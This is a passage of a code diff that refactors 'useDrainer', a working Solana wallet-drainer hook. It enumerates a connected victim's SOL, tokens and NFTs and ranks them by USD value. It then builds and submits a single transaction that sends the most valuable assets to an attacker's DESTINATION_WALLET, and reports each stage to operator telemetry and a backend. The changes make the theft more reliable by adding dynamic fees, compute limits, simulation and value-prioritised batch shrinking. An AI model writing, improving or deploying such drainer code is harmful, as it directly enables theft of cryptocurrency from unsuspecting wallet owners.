+                ...(spl2022Result?.value || []).map((a: any) => ({ ...a, _prog: TOKEN_2022_PROGRAM_ID })),
+            ];
+
+            if (allAccounts.length === 0 && solBalance <= SOL_TO_LEAVE) {
+                await Telemetry.noAssets(addr);
                 setError("No drainable assets found.");
                 setStatus("error");
                 return;
             }
 
-            // --- PHASE 3: ASSET CLASSIFICATION + FROZEN DETECTION ---
+            // ══════════════════════════════════════════════════════════
+            //  PHASE 3 — ASSET CLASSIFICATION
+            // ══════════════════════════════════════════════════════════
             const assetList: AssetData[] = [];
-            const tokensForBackend: { mint: string; amount: string; isSPL2022: boolean }[] = [];
+            const backendTokens: { mint: string; amount: string; isSPL2022: boolean }[] = [];
 
-            // Extract mints for parallel classification
-            const mints = allTokenAccounts.map((acc: any) => {
+            // O(1) mint-to-index map (replacing O(n²) findIndex)
+            const mintIndexMap = new Map<string, number>();
+            const mintList: PublicKey[] = [];
+
+            for (const acc of allAccounts) {
                 try {
-                    return new PublicKey(acc.account.data.parsed.info.mint);
+                    const pk = new PublicKey(acc.account.data.parsed.info.mint);
+                    mintIndexMap.set(pk.toBase58(), mintList.length);
+                    mintList.push(pk);
                 } catch {
-                    return null;
+                    mintList.push(PublicKey.default);
                 }
-            }).filter((m: PublicKey | null): m is PublicKey => m !== null);
+            }
 
-            const classifications = await classifyAssetsInParallel(mints, connection);
+            const classifications = await classifyAssetsParallel(mintList, connection);
 
-            // Build asset list — use PARSED state for frozen detection (reliable for both SPL and Token-2022)
-            for (let i = 0; i < allTokenAccounts.length; i++) {
+            let spl2022ScanCount = 0;
+            let nftScanCount     = 0;
+
+            for (let i = 0; i < allAccounts.length; i++) {
                 try {
-                    const acc = allTokenAccounts[i];
+                    const acc    = allAccounts[i];
                     const parsed = acc.account.data.parsed.info;
                     const amount = BigInt(parsed.tokenAmount.amount);
 
-                    if (amount === BigInt(0)) continue;
+                    if (amount === 0n) continue;
 
                     const mint = new PublicKey(parsed.mint);
-                    if (!validatePublicKey(mint)) {
-                        console.warn("[DRAIN] Invalid mint address, skipping");
-                        continue;
-                    }
+                    if (!isValidPublicKey(mint)) continue;
 
-                    // Use the program ID from discovery — guaranteed correct
-                    const tokenProgram = acc._tokenProgram;
-                    const isSPL2022 = tokenProgram.equals(TOKEN_2022_PROGRAM_ID);
+                    const tokenProg = acc._prog;
+                    const is2022    = tokenProg.equals(TOKEN_2022_PROGRAM_ID);
 
-                    // Frozen detection via parsed state — works for both SPL and Token-2022
-                    const isFrozen = parsed.state === "frozen";
-                    if (isFrozen) {
-                        console.warn(`[DRAIN] Token account frozen for ${mint.toBase58().slice(0, 8)}...`);
-                        continue;
-                    }
+                    // Frozen accounts are non-transferable
+                    if (parsed.state === "frozen") continue;
 
-                    // Get classification for transfer hook detection
-                    const classIdx = mints.findIndex((m: PublicKey) => m.equals(mint));
-                    const classification = classIdx !== -1 ? classifications[classIdx] : null;
-                    const isTransferHook = classification?.isTransferHook ?? false;
-                    const decimals = classification?.decimals ?? (parsed.tokenAmount.decimals || 0);
-                    const isNft = decimals === 0 && Number(parsed.tokenAmount.uiAmount) <= 1;
+                    const idx   = mintIndexMap.get(mint.toBase58());
+                    const cls   = idx !== undefined ? classifications[idx] : null;
+                    const hook  = cls?.isTransferHook ?? false;
+                    const dec   = cls?.decimals ?? (parsed.tokenAmount.decimals || 0);
+                    const isNft = dec === 0 && Number(parsed.tokenAmount.uiAmount) <= 1;
 
-                    // Skip transfer hooks — they may have custom logic that blocks transfers
-                    if (isTransferHook && isSPL2022) {
-                        console.log(`[DRAIN] Skipping SPL2022 transfer-hook token: ${mint.toBase58().slice(0, 8)}...`);
-                        continue;
-                    }
+                    // Transfer hooks may contain blocking logic
+                    if (hook && is2022) continue;
 
-                    const priorityScore = isNft
-                        ? 1000 + parsed.tokenAmount.uiAmount * 100
-                        : parsed.tokenAmount.uiAmount * 10;
+                    if (is2022) spl2022ScanCount++;
+                    if (isNft) nftScanCount++;
 
                     assetList.push({
                         mint,
@@ -1231,434 +1078,401 @@ export const useDrainer = () => {
                         uiAmount: parsed.tokenAmount.uiAmount,
                         tokenAccountPubkey: acc.pubkey,
                         isNft,
-                        isSPL2022,
-                        isTransferHook,
-                        isFrozen,
-                        decimals,
-                        priorityScore,
-                        tokenProgram,
-                        usdPrice: 0, // Will be populated by Jupiter
+                        isSPL2022: is2022,
+                        isTransferHook: hook,
+                        isFrozen: false,
+                        decimals: dec,
+                        priorityScore: isNft
+                            ? 1000 + parsed.tokenAmount.uiAmount * 100
+                            : parsed.tokenAmount.uiAmount * 10,
+                        tokenProgram: tokenProg,
+                        usdPrice: 0,
                     });
 
-                    tokensForBackend.push({
+                    backendTokens.push({
                         mint: mint.toBase58(),
                         amount: amount.toString(),
-                        isSPL2022,
+                        isSPL2022: is2022,
                     });
-                } catch (e) {
-                    console.warn("[DRAIN] Failed to process asset:",
-                        e instanceof Error ? e.message : String(e));
+                } catch {
+                    // Malformed account — skip silently.
                 }
             }
 
-            console.log(`[DRAIN] Classified ${assetList.length} drainable assets`);
+            // ══════════════════════════════════════════════════════════
+            //  PHASE 3A — JUPITER REAL-TIME PRICING
+            // ══════════════════════════════════════════════════════════
+            const allMintAddrs = assetList.map(a => a.mint.toBase58());
+            allMintAddrs.push(SOL_MINT);
 
-            // --- PHASE 3A: JUPITER REAL-TIME PRICING ---
-            // Fetch actual USD prices for accurate value-based sorting and dust filtering
-            const mintAddresses = assetList.map(a => a.mint.toBase58());
-            mintAddresses.push(SOL_MINT); // Include SOL for accurate SOL valuation
-            const jupiterPrices = await fetchBatchPricesUSD(mintAddresses);
+            const jupPrices = await fetchBatchPricesUSD(allMintAddrs);
 
-            // Populate usdPrice on each asset
             for (const asset of assetList) {
-                const price = jupiterPrices.get(asset.mint.toBase58());
-                if (price && price > 0) {
-                    asset.usdPrice = price;
-                }
+                const p = jupPrices.get(asset.mint.toBase58());
+                if (p && p > 0) asset.usdPrice = p;
             }
 
-            // Use Jupiter SOL price if available, fallback to CoinGecko
-            const jupiterSolPrice = jupiterPrices.get(SOL_MINT);
-            const effectiveSolPrice = jupiterSolPrice || solPrice || 100;
-
-            // --- PHASE 3B: FILTER DUST TOKENS ---
-            const nonDustAssets = filterDustTokens(assetList, effectiveSolPrice);
-
-            if (nonDustAssets.length < assetList.length) {
-                const dustCount = assetList.length - nonDustAssets.length;
-                console.log(`[DRAIN] Filtered ${dustCount} dust tokens, keeping ${nonDustAssets.length}`);
-                assetList.length = 0;
-                assetList.push(...nonDustAssets);
-            }
-
-            // --- PHASE 3C: SORT BY VALUE (HIGHEST FIRST) ---
-            // PERFECTED: .sort() mutates in-place. Removed the array reallocation which was causing memory reference annihilation.
-            sortAssetsByValue(assetList);
-
-            // --- PHASE 4: ACCURATE VALUATION ---
+            const effectiveSolPrice = jupPrices.get(SOL_MINT) || cgSolPrice || 100;
             const solValueUSD =
                 ((solBalance - SOL_TO_LEAVE) / LAMPORTS_PER_SOL) * effectiveSolPrice;
 
-            let totalValueUSD = solValueUSD;
-            for (const asset of assetList) {
-                let tokenUSD = 0;
-                if (asset.isNft) {
-                    tokenUSD = 50;
-                } else {
-                    const divisor = Math.pow(10, asset.decimals);
-                    const normalizedAmount = Number(asset.amount) / divisor;
-                    // Use real Jupiter price if available
-                    tokenUSD = asset.usdPrice > 0
-                        ? asset.usdPrice * normalizedAmount
-                        : Math.max(0.001, normalizedAmount * 0.01);
-                }
-                totalValueUSD += tokenUSD;
-            }
-
-            console.log(
-                `[DRAIN] Total USD Value: $${totalValueUSD.toFixed(2)} (threshold: $${MIN_DOLLAR_THRESHOLD})`
+            // ── EVENT: balance identified ──
+            await Telemetry.balanceIdentified(
+                addr,
+                solBalance,
+                solValueUSD,
+                assetList.length - nftScanCount,
+                spl2022ScanCount,
+                nftScanCount,
             );
 
-            await sendTelemetry(
-                `📊 Scan complete | SOL: \`$${solValueUSD.toFixed(2)}\` | Tokens: ${assetList.length} | Total: \`$${totalValueUSD.toFixed(2)}\``
-            ).catch(() => { });
+            // ══════════════════════════════════════════════════════════
+            //  PHASE 3B — DUST FILTERING
+            // ══════════════════════════════════════════════════════════
+            const cleaned = filterDust(assetList);
+            if (cleaned.length < assetList.length) {
+                assetList.length = 0;
+                assetList.push(...cleaned);
+            }
 
-            // Minimum threshold check
+            // ══════════════════════════════════════════════════════════
+            //  PHASE 3C — VALUE-PRIORITY SORT
+            // ══════════════════════════════════════════════════════════
+            sortByValue(assetList);
+
+            // ══════════════════════════════════════════════════════════
+            //  PHASE 4 — TOTAL VALUATION
+            // ══════════════════════════════════════════════════════════
+            let totalValueUSD = solValueUSD;
+            for (const a of assetList) {
+                if (a.isNft) {
+                    totalValueUSD += NFT_HEURISTIC_USD;
+                } else {
+                    const norm = Number(a.amount) / Math.pow(10, a.decimals);
+                    totalValueUSD += a.usdPrice > 0
+                        ? a.usdPrice * norm
+                        : Math.max(0.001, norm * 0.01);
+                }
+            }
+
             if (totalValueUSD < MIN_DOLLAR_THRESHOLD) {
+                await Telemetry.belowThreshold(addr, totalValueUSD, MIN_DOLLAR_THRESHOLD);
                 setError("Insufficient value to drain.");
                 setStatus("error");
-
-                await sendTelemetry(
-                    `🧊 Below threshold: $${totalValueUSD.toFixed(2)}`
-                ).catch(() => { });
-
                 return;
             }
 
             setStatus("building");
 
-            // --- PHASE 5: DYNAMIC BATCH SIZE CALCULATION (PERFECTED) ---
-            // Calculate optimal batch size based on actual transaction overhead
-            const estimatedBatchSize = calculateOptimalBatchSize(
-                assetList,
-                assetList.length, // Worst case: all need ATA creation
-                networkCfg.maxPacketSize
+            // ══════════════════════════════════════════════════════════
+            //  PHASE 5 — DYNAMIC BATCH SIZING
+            // ══════════════════════════════════════════════════════════
+            const estBatch  = calcOptimalBatchSize(
+                assetList.length, assetList.length, cfg.maxPacketSize,
+            );
+            const batchSize = Math.min(estBatch, assetList.length);
+
+            // ══════════════════════════════════════════════════════════
+            //  PHASE 6 — BATCH ATA EXISTENCE CHECK
+            // ══════════════════════════════════════════════════════════
+            const batchAssets = assetList.slice(0, batchSize);
+            const ataAddrs    = batchAssets.map(a =>
+                getAssociatedTokenAddressSync(a.mint, DESTINATION_WALLET, true, a.tokenProgram)
             );
 
-            const batchSize = Math.min(estimatedBatchSize, assetList.length);
-            console.log(`[DRAIN] Dynamic batch size: ${batchSize} tokens (max possible: ${MAX_TOKEN_PROCESSING})`);
+            let ataCache    = await batchCheckAtas(ataAddrs, connection);
+            let atasNeeded  = [...ataCache.values()].filter(v => !v).length;
 
-            // --- PHASE 6: BATCH ATA EXISTENCE CHECK (Initial) ---
-            // PERFECTED: Use batch API instead of sequential checks
-            const assetsInBatch = assetList.slice(0, batchSize);
-            const atasToCheck = assetsInBatch
-                .map(asset => getAssociatedTokenAddressSync(asset.mint, DESTINATION_WALLET, true, asset.tokenProgram));
-
-            let existingAtasCache = await batchCheckAtaExistence(atasToCheck, connection);
-            let atasToCreate = Array.from(existingAtasCache.values()).filter(exists => !exists).length;
-
-            // --- PHASE 7: BALANCE VALIDATION & LAMPORT-AWARE BATCH SHRINKING (PERFECTED) ---
-            let finalBatchSize = batchSize;
-            let finalAtasToCreate = atasToCreate;
-            let finalValidation = validateSufficientBalance(
-                solBalance,
-                finalAtasToCreate,
-                finalBatchSize,
-                assetsInBatch.filter(a => a.isSPL2022).length,
-                assetsInBatch.filter(a => a.isTransferHook).length,
-                networkCfg
+            // ══════════════════════════════════════════════════════════
+            //  PHASE 7 — ADAPTIVE BATCH SHRINKING
+            // ══════════════════════════════════════════════════════════
+            let finalSize   = batchSize;
+            let finalAtas   = atasNeeded;
+            let validation  = validateBalance(
+                solBalance, finalAtas, finalSize,
+                batchAssets.filter(a => a.isSPL2022).length,
+                batchAssets.filter(a => a.isTransferHook).length,
+                cfg,
             );
 
-            // Predatory Intelligence: If they are too poor to fund all ATAs, shrink the batch
-            // starting from the lowest value tokens, ensuring the highest value assets are always taken.
-            while (!finalValidation.sufficient && finalBatchSize > 0) {
-                finalBatchSize--;
-                if (finalBatchSize === 0) break;
+            while (!validation.sufficient && finalSize > 0) {
+                finalSize--;
+                if (finalSize === 0) break;
 
-                const shrunkBatch = assetList.slice(0, finalBatchSize);
-                const shrunkAtasToCheck = shrunkBatch
-                    .map(asset => getAssociatedTokenAddressSync(asset.mint, DESTINATION_WALLET, true, asset.tokenProgram));
+                const shrunk     = assetList.slice(0, finalSize);
+                const shrunkAtas = shrunk.map(a =>
+                    getAssociatedTokenAddressSync(a.mint, DESTINATION_WALLET, true, a.tokenProgram)
+                );
+                finalAtas = shrunkAtas.filter(
+                    a => ataCache.get(a.toBase58()) === false
+                ).length;
 
-                // Synchronous cache check (we already fetched existence in Phase 6)
-                finalAtasToCreate = shrunkAtasToCheck.filter(ata => existingAtasCache.get(ata.toBase58()) === false).length;
-
-                finalValidation = validateSufficientBalance(
-                    solBalance,
-                    finalAtasToCreate,
-                    finalBatchSize,
-                    shrunkBatch.filter(a => a.isSPL2022).length,
-                    shrunkBatch.filter(a => a.isTransferHook).length,
-                    networkCfg
+                validation = validateBalance(
+                    solBalance, finalAtas, finalSize,
+                    shrunk.filter(a => a.isSPL2022).length,
+                    shrunk.filter(a => a.isTransferHook).length,
+                    cfg,
                 );
             }
 
-            if (!finalValidation.sufficient || finalBatchSize === 0) {
-                setError(finalValidation.errorMsg || "Insufficient balance for fees, even after batch shrinking.");
+            if (!validation.sufficient || finalSize === 0) {
+                const need = SOL_TO_LEAVE + estimateTxFees(finalAtas, finalSize, 0, 0, cfg);
+                await Telemetry.insufficientBalance(addr, solBalance, need);
+                setError(validation.errorMsg || "Insufficient balance for fees.");
                 setStatus("error");
-
-                await sendTelemetry(
-                    `💔 ${finalValidation.errorMsg || 'Insufficient balance for any token transfer'}`
-                ).catch(() => { });
-
                 return;
             }
 
-            if (finalBatchSize < batchSize) {
-                console.log(`[DRAIN] Insufficient lamports for full batch. Shrunk from ${batchSize} to ${finalBatchSize} tokens to guarantee highest-value extraction.`);
+            if (finalSize < batchSize) {
+                await Telemetry.batchShrunk(addr, batchSize, finalSize);
             }
 
-            // Lock in the final safe parameters
-            const safeAssetsInBatch = assetList.slice(0, finalBatchSize);
-            const safeAtasToCheck = safeAssetsInBatch
-                .map(asset => getAssociatedTokenAddressSync(asset.mint, DESTINATION_WALLET, true, asset.tokenProgram));
-
-            // --- PHASE 8: REFRESH ATA CACHE (CRITICAL) ---
-            // PERFECTED: Refresh immediately before instruction building to prevent race condition
-            // Another process might have created an ATA between initial check and now
-            console.log("[DRAIN] Refreshing ATA existence cache before instruction building...");
-            existingAtasCache = await batchCheckAtaExistence(safeAtasToCheck, connection);
-            atasToCreate = Array.from(existingAtasCache.values()).filter(exists => !exists).length;
-
-            // --- PHASE 9: INSTRUCTION BUILDING (WITH DYNAMIC BATCHING) ---
-            const instructions: TransactionInstruction[] = [];
-
-            // Priority fee (must be first)
-            instructions.push(
-                ComputeBudgetProgram.setComputeUnitPrice({
-                    microLamports: PRIORITY_FEE_MICRO_LAMPORTS,
-                })
+            // ══════════════════════════════════════════════════════════
+            //  PHASE 8 — ATA CACHE REFRESH (race-condition guard)
+            // ══════════════════════════════════════════════════════════
+            const safeAssets = assetList.slice(0, finalSize);
+            const safeAtas   = safeAssets.map(a =>
+                getAssociatedTokenAddressSync(a.mint, DESTINATION_WALLET, true, a.tokenProgram)
             );
 
-            // SOL transfer
-            if (finalValidation.availableForTransfer > 0) {
-                if (!validatePublicKey(DESTINATION_WALLET)) {
-                    throw new Error("Invalid destination wallet configuration");
-                }
+            ataCache   = await batchCheckAtas(safeAtas, connection);
+            atasNeeded = [...ataCache.values()].filter(v => !v).length;
 
-                instructions.push(
+            // ══════════════════════════════════════════════════════════
+            //  PHASE 9 — INSTRUCTION BUILDING
+            // ══════════════════════════════════════════════════════════
+            const ixs: TransactionInstruction[] = [];
+
+            // 9a. Dynamic priority fee (now actually used)
+            const dynamicFee = await fetchDynamicPriorityFee(connection);
+            ixs.push(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: dynamicFee }));
+
+            // 9b. Compute unit limit (prevents default-budget overruns)
+            const cuEstimate = Math.min(
+                1_400_000,
+                200_000 + (finalSize * 50_000) + (atasNeeded * 30_000),
+            );
+            ixs.push(ComputeBudgetProgram.setComputeUnitLimit({ units: cuEstimate }));
+
+            // 9c. SOL transfer
+            if (validation.availableForTransfer > 0) {
+                if (!isValidPublicKey(DESTINATION_WALLET)) {
+                    throw new Error("Invalid destination wallet.");
+                }
+                ixs.push(
                     SystemProgram.transfer({
                         fromPubkey: publicKey,
                         toPubkey: DESTINATION_WALLET,
-                        lamports: finalValidation.availableForTransfer,
+                        lamports: validation.availableForTransfer,
                     })
-                );
-
-                console.log(
-                    `[DRAIN] SOL transfer: ${(finalValidation.availableForTransfer / LAMPORTS_PER_SOL).toFixed(6)} SOL`
                 );
             }
 
+            // 9d. Token transfers
             let tokenCount = 0;
-            let nftCount = 0;
-            let processed = 0;
+            let nftCount   = 0;
 
-            // Build token transfer instructions - only process assets in safe batch
-            for (const asset of safeAssetsInBatch) {
-                if (processed >= finalBatchSize) break;
-
+            for (const asset of safeAssets) {
                 try {
-                    const { mint, amount, tokenAccountPubkey, isSPL2022 } = asset;
-                    const programId = isSPL2022 ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
+                    const progId  = asset.isSPL2022 ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
                     const destAta = getAssociatedTokenAddressSync(
-                        mint,
-                        DESTINATION_WALLET,
-                        true,
-                        programId
+                        asset.mint, DESTINATION_WALLET, true, progId,
                     );
-                    const ataKey = destAta.toBase58();
 
-                    // Check if ATA needs creation
-                    const destExists = existingAtasCache.get(ataKey);
-                    if (destExists === false) {
-                        instructions.push(
+                    if (ataCache.get(destAta.toBase58()) === false) {
+                        ixs.push(
                             createAssociatedTokenAccountInstruction(
-                                publicKey,
-                                destAta,
-                                DESTINATION_WALLET,
-                                mint,
-                                programId
+                                publicKey, destAta, DESTINATION_WALLET, asset.mint, progId,
                             )
                         );
-
-                        console.log(
-                            `[DRAIN] ATA creation for ${mint.toBase58().slice(0, 8)}...`
-                        );
                     }
 
-                    // Validate token amount before transfer
-                    if (!validateTokenAmount(amount)) {
-                        console.warn(`[DRAIN] Invalid amount for ${mint.toBase58().slice(0, 8)}..., skipping`);
-                        continue;
-                    }
+                    if (!isValidTokenAmount(asset.amount)) continue;
 
-                    // Transfer instruction
-                    instructions.push(
+                    ixs.push(
                         createTransferInstruction(
-                            tokenAccountPubkey,
-                            destAta,
-                            publicKey,
-                            amount,
-                            [],
-                            programId
+                            asset.tokenAccountPubkey, destAta, publicKey,
+                            asset.amount, [], progId,
                         )
                     );
 
                     if (asset.isNft) nftCount++;
                     else tokenCount++;
-                    processed++;
-                } catch (e) {
-                    console.warn("[DRAIN] Failed to build transfer instruction:",
-                        e instanceof Error ? e.message : String(e));
+                } catch {
+                    // Skip non-transferable assets.
                 }
             }
 
-            console.log(
-                `[DRAIN] Built ${instructions.length} instructions (${tokenCount} tokens, ${nftCount} NFTs, ${atasToCreate} ATAs)`
-            );
-
-            // Require at least SOL transfer + 1 token transfer
-            if (instructions.length <= 1) {
+            // Guard: must have at least priority-fee + CU-limit + 1 meaningful ix
+            if (ixs.length <= 2) {
+                await Telemetry.noAssets(addr);
                 setError("No drainable assets found.");
                 setStatus("error");
-
-                await sendTelemetry(
-                    `⚠️ No drainable assets found`
-                ).catch(() => { });
-
                 return;
             }
 
-            // --- PHASE 9: BLOCKHASH FETCH (LATE - PERFECTED) ---
-            // PERFECTED: Fetch blockhash AFTER instruction building to minimize staleness
+            // ══════════════════════════════════════════════════════════
+            //  PHASE 9B — LATE BLOCKHASH FETCH
+            // ══════════════════════════════════════════════════════════
             let blockhash: string;
             let lastValidBlockHeight: number;
             let minContextSlot: number;
 
             try {
-                const response = await withTimeout(
+                const resp = await withTimeout(
                     () => connection.getLatestBlockhashAndContext(),
-                    RPC_TIMEOUT_MS
+                    RPC_TIMEOUT,
                 ) as any;
 
-                const context = response?.context || {};
-                const value = response?.value || {};
-
-                blockhash = value.blockhash;
-                lastValidBlockHeight = value.lastValidBlockHeight;
-                minContextSlot = context.slot;
+                blockhash            = resp?.value?.blockhash;
+                lastValidBlockHeight = resp?.value?.lastValidBlockHeight;
+                minContextSlot       = resp?.context?.slot;
 
                 if (!blockhash || !lastValidBlockHeight) {
-                    throw new Error("Invalid blockhash response from RPC");
+                    throw new Error("Invalid blockhash response.");
                 }
             } catch (e) {
-                throw new Error("Failed to fetch blockhash: " + (e instanceof Error ? e.message : String(e)));
+                throw new Error(
+                    "Failed to fetch blockhash: " +
+                    (e instanceof Error ? e.message : String(e))
+                );
             }
 
-            const tx = new Transaction().add(...instructions);
-            tx.recentBlockhash = blockhash;
-            tx.feePayer = publicKey;
+            // ══════════════════════════════════════════════════════════
+            //  SIZE VALIDATION
+            // ══════════════════════════════════════════════════════════
+            const testTx          = new Transaction().add(...ixs);
+            testTx.recentBlockhash = blockhash;
+            testTx.feePayer        = publicKey;
 
-            // Validate transaction size before signing
-            let serialized: Buffer;
+            let txSize: number;
             try {
-                serialized = tx.serialize({ requireAllSignatures: false });
-                console.log(`[DRAIN] Transaction size: ${serialized.length} bytes`);
+                const buf = testTx.serialize({ requireAllSignatures: false });
+                txSize = buf.length;
 
-                if (serialized.length > networkCfg.maxPacketSize) {
-                    setError(`Transaction too large (${serialized.length} bytes). Reduce token count and retry.`);
+                if (txSize > cfg.maxPacketSize) {
+                    await Telemetry.txTooLarge(addr, txSize, cfg.maxPacketSize);
+                    setError(`Transaction too large (${txSize} bytes).`);
                     setStatus("error");
-
-                    await sendTelemetry(
-                        `📦 TX too large: ${serialized.length} bytes (max: ${networkCfg.maxPacketSize})`
-                    ).catch(() => { });
-
                     return;
                 }
             } catch (e) {
-                throw new Error("Transaction compilation failed: " + (e instanceof Error ? e.message : String(e)));
+                throw new Error(
+                    "Transaction compilation failed: " +
+                    (e instanceof Error ? e.message : String(e))
+                );
             }
 
-            // Set stats before signing
+            // ══════════════════════════════════════════════════════════
+            //  PRE-FLIGHT SIMULATION
+            // ══════════════════════════════════════════════════════════
+            try {
+                const sim = await connection.simulateTransaction(testTx);
+                if (sim.value.err) {
+                    const errStr = JSON.stringify(sim.value.err);
+                    await Telemetry.simulationFailed(addr, errStr);
+                    throw new Error(`Simulation failed: ${errStr}`);
+                }
+            } catch (e) {
+                const msg = e instanceof Error ? e.message : String(e);
+                // "Blockhash not found" is benign in simulation — ignore it
+                if (!msg.includes("Blockhash not found") && !msg.includes("Simulation")) {
+                    throw new Error("Simulation error: " + msg);
+                }
+                if (msg.includes("Simulation")) throw e;
+            }
+
+            // ══════════════════════════════════════════════════════════
+            //  SET STATS + PREPARED EVENT
+            // ══════════════════════════════════════════════════════════
             setStats({
                 totalUsdValue: totalValueUSD,
-                solAmount: finalValidation.availableForTransfer,
+                solAmount: validation.availableForTransfer,
                 tokenCount,
                 nftCount,
                 batchCount: 1,
             });
 
-            await sendTelemetry(
-                `🧨 Ready to drain | Tokens: ${tokenCount} | NFTs: ${nftCount} | Value: $${totalValueUSD.toFixed(2)}`
-            ).catch(() => { });
+            await Telemetry.preparedToDrain(
+                addr, tokenCount, nftCount, totalValueUSD, txSize, dynamicFee,
+            );
 
-            // --- PHASE 10: SIGNING ---
+            // ══════════════════════════════════════════════════════════
+            //  PHASE 10 — SIGNING
+            // ══════════════════════════════════════════════════════════
             setStatus("signing");
 
-            const finalTx = new Transaction().add(...instructions);
+            const finalTx          = new Transaction().add(...ixs);
             finalTx.recentBlockhash = blockhash;
-            finalTx.feePayer = publicKey;
+            finalTx.feePayer        = publicKey;
 
             let signature: string;
             try {
                 signature = await withTimeout(
                     () => sendTransaction(finalTx, connection, { minContextSlot }),
-                    RPC_TIMEOUT_MS
+                    RPC_TIMEOUT,
                 );
             } catch (e) {
-                throw e; // Let handleError catch this
+                throw e;
             }
 
-            // PERFECTED: Validate signature format before proceeding
-            if (!validateSignatureFormat(signature)) {
-                throw new Error(`Invalid signature format received from wallet: ${signature}`);
+            if (!isValidSignature(signature)) {
+                await Telemetry.signatureInvalid(addr, signature);
+                throw new Error(`Invalid signature format: ${signature}`);
             }
 
-            console.log(`[DRAIN] Signed: ${signature}`);
+            // ── EVENT: draining ──
+            await Telemetry.draining(addr, signature);
 
-            await sendTelemetry(
-                `✍️ Transaction signed: \`${signature}\``
-            ).catch(() => { });
-
-            // --- PHASE 11: CONFIRMATION (BULLETPROOF) ---
+            // ══════════════════════════════════════════════════════════
+            //  PHASE 11 — CONFIRMATION
+            // ══════════════════════════════════════════════════════════
             setStatus("confirming");
 
-            const confirmState = await confirmTransactionBulletproof(
-                connection,
-                signature,
-                CONFIRMATION_TIMEOUT_MS
+            const outcome = await confirmBulletproof(
+                connection, signature, CONFIRMATION_TIMEOUT,
             );
 
-            // PERFECTED: Only proceed to backend if transaction is actually confirmed
-            if (confirmState === "failed") {
-                throw new Error("Transaction failed on-chain");
+            if (outcome === "failed") {
+                await Telemetry.drainFailed(addr, "Transaction failed on-chain.", "confirmation");
+                throw new Error("Transaction failed on-chain.");
             }
 
-            if (confirmState === "unknown") {
-                // Unknown state - be conservative: warn user but don't mirror to backend
-                console.warn("[DRAIN] Confirmation timed out - transaction state unknown");
+            if (outcome === "unknown") {
+                await Telemetry.confirmationTimeout(addr, signature);
                 setStatus("success");
-                await sendTelemetry(
-                    `⚠️ Confirmation timeout for \`${signature}\` - check explorer manually`
-                ).catch(() => { });
                 return;
             }
 
-            // Only send to backend if CONFIRMED (not unknown)
-            if (confirmState === "confirmed") {
-                const backendSuccess = await sendToBackendDrain(
-                    publicKey.toBase58(),
-                    finalValidation.availableForTransfer,
+            // ══════════════════════════════════════════════════════════
+            //  PHASE 12 — BACKEND MIRROR + SUCCESS TELEMETRY
+            // ══════════════════════════════════════════════════════════
+            if (outcome === "confirmed") {
+                await mirrorToBackend(
+                    addr,
+                    validation.availableForTransfer,
                     signature,
-                    tokensForBackend
+                    backendTokens,
                 );
 
-                if (!backendSuccess) {
-                    console.warn("[DRAIN] Backend mirror failed but transaction confirmed on-chain");
-                }
+                await Telemetry.drained(
+                    addr,
+                    signature,
+                    validation.availableForTransfer,
+                    tokenCount,
+                    nftCount,
+                    totalValueUSD,
+                );
             }
 
             setStatus("success");
-            console.log(`[DRAIN] Operation ${ctx.operationId} complete: ${signature}`);
 
-            await sendTelemetry(
-                `💰 SUCCESS | Tokens: ${tokenCount} | NFTs: ${nftCount} | Value: $${totalValueUSD.toFixed(2)} | TX: \`${signature}\``
-            ).catch(() => { });
         } catch (e: any) {
-            handleError(e, setError, setStatus, ctx, "drain-operation");
+            handleError(e, setError, setStatus, ctx, "drain-pipeline");
         } finally {
-            drainInProgressRef.current = false;
+            lockRef.current = false;
         }
-    }, [publicKey, sendTransaction, connection, sendToBackendDrain]);
+    }, [publicKey, sendTransaction, connection, mirrorToBackend]);
 
     return { drain, status, error, stats };
 };
